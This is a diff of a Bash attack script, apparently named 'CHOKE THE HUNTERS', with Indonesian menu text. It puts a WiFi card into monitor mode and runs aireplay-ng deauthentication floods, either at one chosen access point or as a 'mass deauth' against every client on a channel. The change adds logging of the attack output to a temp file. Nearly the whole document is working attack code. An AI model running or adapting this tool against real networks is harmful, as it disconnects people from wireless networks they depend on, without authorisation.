@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # ============================================
-#   MODULE: CHOKE THE HUNTERS (v5.0 Anti-Freeze)
+#   MODULE: CHOKE THE HUNTERS (v6.0 Log Debug)
 # ============================================
 
 if [ -f "./bxp_libcore.sh" ]; then source ./bxp_libcore.sh; fi
@@ -32,26 +32,16 @@ detect_env() {
 pilih_interface() {
     echo -e "\n${C}=== DAFTAR INTERFACE WIFI ===${N}"
     local IFACES=($(iw dev 2>/dev/null | awk '/Interface/{print $2}'))
-    
-    if [ ${#IFACES[@]} -eq 0 ]; then
-        echo -e "\033[0;31m[!] Tidak ada interface WiFi yang terdeteksi.\033[0m"
-        return 1
-    fi
-
+    if [ ${#IFACES[@]} -eq 0 ]; then echo -e "\033[0;31m[!] Tidak ada interface.\033[0m"; return 1; fi
     for i in "${!IFACES[@]}"; do
         local SUPPORT=$(iw phy $(iw dev ${IFACES[$i]} info 2>/dev/null | grep wiphy | awk '{print $2}') info 2>/dev/null | grep -q "monitor" && echo "[Support Monitor]" || echo "[No Monitor]")
         echo -e "  \033[1;32m[$((i+1))]\033[0m ${IFACES[$i]} \033[1;33m$SUPPORT\033[0m"
     done
-
     echo ""
     read -p "Pilih nomor interface (default 1): " IFACE_CHOICE
     IFACE_CHOICE=${IFACE_CHOICE:-1}
     IFACE=${IFACES[$((IFACE_CHOICE-1))]}
-
-    if [ -z "$IFACE" ]; then
-        echo -e "\033[0;31m[!] Pilihan tidak valid.\033[0m"
-        return 1
-    fi
+    if [ -z "$IFACE" ]; then echo -e "\033[0;31m[!] Pilihan tidak valid.\033[0m"; return 1; fi
     return 0
 }
 
@@ -61,7 +51,6 @@ setup_monitor() {
     nmcli radio wifi off 2>/dev/null
     airmon-ng check kill >/dev/null 2>&1
     airmon-ng start "$IFACE" >/dev/null 2>&1
-    
     MON_IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -E "mon" | head -n 1)
     if [ -z "$MON_IFACE" ]; then MON_IFACE="$IFACE"; fi
     echo -e "\033[0;32m[+] Monitor Mode Aktif di: $MON_IFACE\033[0m"
@@ -89,7 +78,6 @@ while true; do
     echo -e "    Status: $STATUS_MSG"
     echo -e "${C}======================================================${N}"
     echo ""
-    
     if [ "$ROOT_MODE" -eq 1 ]; then
         echo -e "  \033[1;32m[1]\033[0m  \033[1;37mTargeted Deauth (1 BSSID)\033[0m"
         echo -e "  \033[1;32m[2]\033[0m  \033[1;37mMass Deauth (Semua Client)\033[0m"
@@ -120,19 +108,22 @@ while true; do
             DEAUTH_COUNT=${DEAUTH_COUNT:-50}
             
             setup_monitor
-            # Set channel biar fokus nembak
             iw dev "$MON_IFACE" set channel "$CHAN" >/dev/null 2>&1
             
             echo -e "\n${R}[*] Meluncurkan Deauth ke $BSSID...${N}"
-            aireplay-ng --deauth "$DEAUTH_COUNT" -a "$BSSID" "$MON_IFACE" > /dev/null 2>&1 &
+            aireplay-ng --deauth "$DEAUTH_COUNT" -a "$BSSID" "$MON_IFACE" > /tmp/deauth_log.txt 2>&1 &
             DEAUTH_PID=$!
             
-            echo -e "\033[1;33m[*] Deauth berjalan di background. Tekan [ENTER] untuk STOP...\033[0m"
+            echo -e "\033[1;33m[*] Deauth berjalan di background.\033[0m"
+            echo -e "\033[1;33m[*] Tekan [ENTER] untuk STOP...\033[0m"
             read -r
             
             echo -e "\n${Y}[*] Menghentikan Deauth...${N}"
             kill -9 $DEAUTH_PID 2>/dev/null
             wait $DEAUTH_PID 2>/dev/null
+            
+            echo -e "\n${G}[+] Log Deauth Terakhir:${N}"
+            cat /tmp/deauth_log.txt
             
             cleanup
             read -p "Press Enter to continue..."
@@ -147,15 +138,19 @@ while true; do
             iw dev "$MON_IFACE" set channel "$CHAN" >/dev/null 2>&1
             
             echo -e "\n${R}[*] Meluncurkan Mass Deauth di Channel $CHAN...${N}"
-            aireplay-ng --deauth "$DEAUTH_COUNT" -a "FF:FF:FF:FF:FF:FF" "$MON_IFACE" > /dev/null 2>&1 &
+            aireplay-ng --deauth "$DEAUTH_COUNT" -a "FF:FF:FF:FF:FF:FF" "$MON_IFACE" > /tmp/deauth_log.txt 2>&1 &
             DEAUTH_PID=$!
             
-            echo -e "\033[1;33m[*] Mass Deauth berjalan di background. Tekan [ENTER] untuk STOP...\033[0m"
+            echo -e "\033[1;33m[*] Mass Deauth berjalan di background.\033[0m"
+            echo -e "\033[1;33m[*] Tekan [ENTER] untuk STOP...\033[0m"
             read -r
             
             echo -e "\n${Y}[*] Menghentikan Mass Deauth...${N}"
             kill -9 $DEAUTH_PID 2>/dev/null
             wait $DEAUTH_PID 2>/dev/null
+            
+            echo -e "\n${G}[+] Log Deauth Terakhir:${N}"
+            cat /tmp/deauth_log.txt
             
             cleanup
             read -p "Press Enter to continue..."
